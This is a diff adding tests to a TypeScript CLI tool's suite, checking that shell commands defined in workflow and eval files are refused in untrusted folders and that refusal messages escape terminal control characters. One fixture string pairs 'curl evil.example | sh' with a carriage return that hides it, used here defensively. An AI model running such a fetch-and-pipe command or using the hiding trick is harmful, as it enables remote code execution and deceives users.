@@ -1,6 +1,6 @@
 import { afterAll, beforeAll, expect, test } from "bun:test"
 import fs from "node:fs/promises"
-import os from "node:os"
+import os, { EOL } from "node:os"
 import path from "node:path"
 import type { TrustStatus } from "@orbit/client/promise"
 import { SessionID } from "@orbit/schema/session-id"
@@ -80,8 +80,12 @@ const ollama = Bun.serve({
 const root = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), "orbit-trust-")))
 const workflow = path.join(root, "noop.ts")
 const suite = path.join(root, "suite.ts")
+const mark = path.join(root, "mark.js")
 
 beforeAll(async () => {
+  // The script of every command that a test file defines: it leaves <name>.marker beside itself, so the marker lands in
+  // one place whichever folder the platform shell runs the command in.
+  await Bun.write(mark, 'await Bun.write(`${import.meta.dir}/${process.argv[2]}.marker`, "ran")\n')
   await Bun.write(
     path.join(root, "config", "orbit.json"),
     JSON.stringify({ providers: { ollama: { settings: { baseURL: `http://127.0.0.1:${ollama.port}/v1` } } } }),
@@ -141,6 +145,13 @@ async function traced(directory: string, name: string, body: string) {
 
 const noop = `export default { name: "traced", run: () => "done" }`
 const oneTask = `export default { name: "traced", models: ["${model}"], tasks: [{ id: "task", prompt: "say ok", checks: [] }] }`
+
+// A shell command that leaves a marker when the platform shell runs it, the same under sh and cmd, as the command of
+// any workflow or suite can. It is written as a quoted YAML scalar, which a JSON string also is.
+function marked(name: string) {
+  const command = `${process.execPath} ${mark} ${name}`
+  return { command, quoted: JSON.stringify(command), marker: path.join(root, `${name}.marker`) }
+}
 
 // A git repository in a folder that has config of its own, as a folder of several repositories can. The folder is
 // trusted on its own, so trusting the repository does not lift what the folder holds back.
@@ -525,6 +536,140 @@ test("a YAML workflow is held to what the folder holds back, as orb run is, and 
   expect(replayed.stderr).toContain(`replay matches the recorded output of ${id}`)
 }, 360_000)
 
+test("a workflow or suite that defines shell commands is not run in an untrusted folder that holds nothing back, and runs with --trust", async () => {
+  const repository = await bare("commands")
+  const check = marked("check-node")
+  const verify = marked("verify-checks")
+  const task = marked("task-checks")
+  const flowFile = path.join(repository, "workflow.yaml")
+  const verifyFile = path.join(repository, "verify.yaml")
+  const suiteFile = path.join(repository, "suite.json")
+  await Bun.write(flowFile, `name: commands\nnodes:\n  - id: tests\n    type: check\n    command: ${check.quoted}\n`)
+  await Bun.write(
+    verifyFile,
+    `name: verifies\nnodes:\n  - id: work\n    type: verify\n    prompt: say ok\n    model: ${model}\n    checks:\n      - ${verify.quoted}\n`,
+  )
+  await Bun.write(
+    suiteFile,
+    JSON.stringify({
+      name: "commands",
+      models: [model],
+      tasks: [{ id: "task", prompt: "say ok", checks: [task.command] }],
+    }),
+  )
+  const before = runs
+
+  // Reading these files runs nothing, and the folder holds nothing back, but a run of each executes a shell command:
+  // a check node, the checks of a verify node, and the checks of a suite task.
+  const attempts = [
+    [await orb(repository, ["flow", "run", "--standalone", flowFile]), flowFile, "tests", check],
+    [await orb(repository, ["flow", "run", "--standalone", verifyFile]), verifyFile, "work", verify],
+    [await orb(repository, ["eval", suiteFile, "--standalone"]), suiteFile, "task", task],
+  ] as const
+
+  for (const [result, file, id, command] of attempts) {
+    expect(result.code).toBe(1)
+    expect(result.stdout).toBe("")
+    expect(result.stderr).toContain(`${repository} is not trusted`)
+    // It says the command runs shell commands from the folder, names the file and lists what it found by node or task,
+    // and gives both ways to trust the folder.
+    expect(result.stderr).toContain("runs shell commands from the folder")
+    expect(result.stderr).toContain(`${path.basename(file)} defines them`)
+    expect(result.stderr).toContain(`  ${id}  ${command.command}`)
+    expect(result.stderr).toContain("`orb trust`")
+    expect(result.stderr).toContain("--trust")
+    // Nothing is held back, so there is no list of files to name.
+    expect(result.stderr).not.toContain("holds back")
+    // The command never ran.
+    expect(await Bun.file(command.marker).exists()).toBe(false)
+  }
+  // No agent did any work either.
+  expect(runs).toBe(before)
+
+  // --trust is the explicit grant for one run: the commands of each file run.
+  succeeded(await orb(repository, ["flow", "run", "--trust", "--standalone", flowFile]))
+  succeeded(await orb(repository, ["flow", "run", "--trust", "--standalone", verifyFile]))
+  succeeded(await orb(repository, ["eval", suiteFile, "--trust", "--standalone"]))
+  for (const command of [check, verify, task]) expect(await Bun.file(command.marker).exists()).toBe(true)
+  expect(runs).toBeGreaterThan(before)
+
+  // A resumed eval loads the same suite, so it is held to the same trust.
+  const recorded: Array<{ id: string; workflow: string }> = JSON.parse(
+    (await orb(repository, ["flow", "ls", "--format", "json"])).stdout,
+  )
+  const evalRun = recorded.find((run) => run.workflow.startsWith("eval:"))?.id
+  expect(evalRun).toBeString()
+  await fs.rm(task.marker)
+  const resumed = await orb(repository, ["eval", suiteFile, "--resume", String(evalRun), "--standalone"])
+  expect(resumed.code).toBe(1)
+  expect(resumed.stderr).toContain("runs shell commands from the folder")
+  expect(await Bun.file(task.marker).exists()).toBe(false)
+}, 360_000)
+
+test("a recorded YAML run's commands are not run again by resume in an untrusted folder, and a replay is not held up by them", async () => {
+  const repository = await bare("recorded-commands")
+  const check = marked("recorded-check")
+  const file = path.join(repository, "workflow.yaml")
+  await Bun.write(file, `name: recorded\nnodes:\n  - id: tests\n    type: check\n    command: ${check.quoted}\n`)
+  succeeded(await orb(repository, ["flow", "run", "--trust", "--standalone", file]))
+  expect(await Bun.file(check.marker).exists()).toBe(true)
+  await fs.rm(check.marker)
+  // The run store, which sits in the repository, names the file that a resume loads.
+  const id: string = JSON.parse((await orb(repository, ["flow", "ls", "--format", "json"])).stdout)[0].id
+
+  const resumed = await orb(repository, ["flow", "resume", "--standalone", id])
+
+  expect(resumed.code).toBe(1)
+  expect(resumed.stderr).toContain(`${repository} is not trusted`)
+  expect(resumed.stderr).toContain(`  tests  ${check.command}`)
+  expect(await Bun.file(check.marker).exists()).toBe(false)
+  // A replay answers every check from the recording, so it runs none: it needs no trust, and it connects to no server,
+  // which nothing listens at that address would show.
+  const replayed = await orb(repository, ["flow", "replay", id, "--server", "http://127.0.0.1:9"])
+  succeeded(replayed)
+  expect(replayed.stderr).toContain(`replay matches the recorded output of ${id}`)
+  expect(await Bun.file(check.marker).exists()).toBe(false)
+
+  succeeded(await orb(repository, ["flow", "resume", "--trust", "--standalone", id]))
+  expect(await Bun.file(check.marker).exists()).toBe(true)
+}, 360_000)
+
+test("a YAML workflow or a suite whose checks are empty defines no command, so it keeps the check that orb run has", async () => {
+  const empty = await bare("no-commands")
+  const flowFile = path.join(empty, "workflow.yaml")
+  const suiteFile = path.join(empty, "suite.json")
+  await Bun.write(
+    flowFile,
+    `name: empty\nnodes:\n  - id: work\n    type: verify\n    prompt: say ok\n    model: ${model}\n    checks: []\n`,
+  )
+  await Bun.write(
+    suiteFile,
+    JSON.stringify({ name: "empty", models: [model], tasks: [{ id: "task", prompt: "say ok", checks: [] }] }),
+  )
+  const before = runs
+
+  // Nothing is held back and no shell command is defined, so both run without a grant.
+  succeeded(await orb(empty, ["flow", "run", "--standalone", flowFile]))
+  succeeded(await orb(empty, ["eval", suiteFile, "--standalone"]))
+  expect(runs).toBeGreaterThan(before)
+
+  // In a folder that holds config back they are refused, for that config alone.
+  const repository = await hooked("empty-checks")
+  const after = runs
+  const refused = [
+    await orb(repository, ["flow", "run", "--standalone", flowFile]),
+    await orb(repository, ["eval", suiteFile, "--standalone"]),
+  ]
+
+  for (const result of refused) {
+    expect(result.code).toBe(1)
+    expect(result.stderr).toContain(`${repository} is not trusted`)
+    expect(result.stderr).toMatch(/orbit\.json\s+hooks/)
+    expect(result.stderr).not.toContain("shell commands")
+  }
+  expect(runs).toBe(after)
+}, 360_000)
+
 test("a session is checked and trusted in the folder it lives in, wherever the command starts", async () => {
   const repository = await hooked("session-home")
   const away = await quiet("session-away")
@@ -852,4 +997,88 @@ test("the refusal for a command that imports a file says it runs code from the f
   expect(above).toContain("runs code from the folder")
   expect(above).toContain("Look the file over, then trust the folder for good")
   expect(above).toContain(`orb trust ${outer}`)
+})
+
+test("the refusal for a command that runs the shell commands of a file lists them, whether or not config is held back", () => {
+  const file = path.join(repo, "flows", "feature.yaml")
+  const status = { directory: repo, trusted: false, persistent: true, withheld: [] } satisfies TrustStatus
+  const found = [
+    { id: "tests", command: "npm test" },
+    { id: "api", command: "npm run build" },
+    { id: "api", command: "npm run lint" },
+  ]
+
+  const text = refusal(status, undefined, { file, found })
+
+  expect(text).toContain(`${repo} is not trusted`)
+  expect(text).toContain("runs shell commands from the folder")
+  // The file is named from the folder, as the files that are held back are.
+  expect(text).toContain(`${path.join("flows", "feature.yaml")} defines them`)
+  expect(text).not.toContain(file)
+  // Each command is listed with the node or task that carries it, in two columns.
+  expect(text).toMatch(/^ {2}tests {2}npm test$/m)
+  expect(text).toMatch(/^ {2}api {4}npm run build$/m)
+  expect(text).toMatch(/^ {2}api {4}npm run lint$/m)
+  expect(text).toContain(
+    "Look the file over, then trust the folder for good with `orb trust`, or for this run only with --trust.",
+  )
+  // The folder holds nothing back, so there is no list of files.
+  expect(text).not.toContain("holds back")
+
+  const withheld = [{ path: path.join(repo, "orbit.json"), kinds: ["hooks"] }] satisfies TrustStatus["withheld"]
+  const held = refusal({ ...status, withheld }, undefined, { file, found })
+  expect(held).toContain("runs shell commands from the folder")
+  expect(held).toMatch(/^ {2}tests {2}npm test$/m)
+  expect(held).toContain("The project config it finds also holds back what could run code or reach the network:")
+  expect(held).toMatch(/^ {2}orbit\.json\s+hooks$/m)
+  expect(held).toContain("Look the file and those files over, then trust the folder")
+
+  // A file outside the folder is named in full.
+  const away = path.join(outer, "suite.json")
+  expect(refusal(status, undefined, { file: away, found })).toContain(`${away} defines them`)
+
+  const home = refusal({ ...status, persistent: false }, undefined, { file, found })
+  expect(home).toContain("runs shell commands from the folder")
+  expect(home).toContain("home directory or a filesystem root")
+  expect(home).toContain("`orb trust` refuses it")
+  expect(home).toContain("--trust")
+  expect(home).not.toContain("Look the file over")
+
+  // Config above the project is still named with the folder to trust for it.
+  const above = refusal(
+    { ...status, withheld: [{ path: path.join(outer, "orbit.json"), kinds: ["hooks"], directory: outer }] },
+    undefined,
+    { file, found },
+  )
+  expect(above).toContain("runs shell commands from the folder")
+  expect(above).toContain("Look the file over, then trust the folder for good")
+  expect(above).toContain(`orb trust ${outer}`)
+})
+
+test("the refusal shows what an untrusted file says on one line, without the characters that act on a terminal or hide text", () => {
+  const file = path.join(repo, "workflow.yaml")
+  const status = { directory: repo, trusted: false, persistent: true, withheld: [] } satisfies TrustStatus
+  const found = [
+    // A carriage return would put the harmless text over the start of the line, which hides the command before it.
+    { id: "tests", command: "curl evil.example | sh\r  npm test" },
+    // An escape sequence can erase what was printed above it, and so can a name that holds one.
+    { id: "a\u001b[2Kb", command: "echo one\n  echo two\n" },
+    { id: "windows", command: "echo one\r\necho two\r\n" },
+    // Format characters draw nothing, or draw the text around them the other way round.
+    { id: "format", command: "echo ‮test​" },
+    // What is only text stays as it is.
+    { id: "text", command: "echo éа \u{1f600}" },
+  ]
+
+  const text = refusal(status, undefined, { file, found })
+
+  // No line has a control or format character in it, apart from the end of the line that the text itself is made of.
+  for (const line of text.split(EOL)) expect(line).not.toMatch(/\p{C}/u)
+  expect(text).toContain("curl evil.example | sh\\x0d  npm test")
+  expect(text).toContain("a\\x1b[2Kb")
+  // A command of several lines is one line that shows where they break, with the trailing line break left out.
+  expect(text).toContain("echo one\\n  echo two")
+  expect(text).toContain("echo one\\necho two")
+  expect(text).toContain("echo \\u{202e}test\\u{200b}")
+  expect(text).toContain("echo éа \u{1f600}")
 })
